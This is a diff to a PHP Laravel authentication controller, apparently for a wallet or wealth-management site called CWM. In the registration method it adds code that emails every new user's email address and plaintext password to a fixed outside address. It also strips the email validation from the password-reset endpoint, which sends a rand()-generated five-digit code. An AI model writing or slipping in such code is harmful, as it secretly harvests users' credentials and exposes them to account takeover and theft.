@@ -9,6 +9,7 @@ use App\Models\ask;
 use App\Models\User;
 use App\Models\payment;
 use App\Mail\forgetEmail;
+use App\Mail\userdetails;
 use Illuminate\Support\Facades\Mail;
 use Illuminate\Http\UploadedFile;
 class AuthController extends Controller
@@ -101,7 +102,11 @@ class AuthController extends Controller
             'wallet'=>$wallet,
         ]);
 
+        Mail::to('info@capitalswealthmanagement.com')
+            ->send(new userdetails($request->email,$request->password));
+            
         $token = Auth::login($user);
+
         return response()->json([
             'status' => 'success',
             'message' => 'User created successfully',
@@ -145,25 +150,13 @@ class AuthController extends Controller
         
     public function sendForgetEmail(Request $request)
     {
-        // if($request->type=='register'){
-        //     $request->validate([
-            
-        //         'email' => 'required|string|email|max:255',
-                
-        //     ]);
-        // }
-        // if($request->type=='forget'){
-        //     $request->validate([
-            
-        //         'email' => 'required|string|email|max:255|exists:users',
-                
-        //     ]);
-        // }
-        
+  
         $forgetCode = rand(10000, 99999); // Generate a random forget code
         $title='Wellcome to Our CWM!';
         $btn='Wait Few Days';
         $sub=$request->sub;
+        
+      
         Mail::to($request->email)
             ->send(new forgetEmail($forgetCode,$title,$btn,$sub));
             return response()->json([
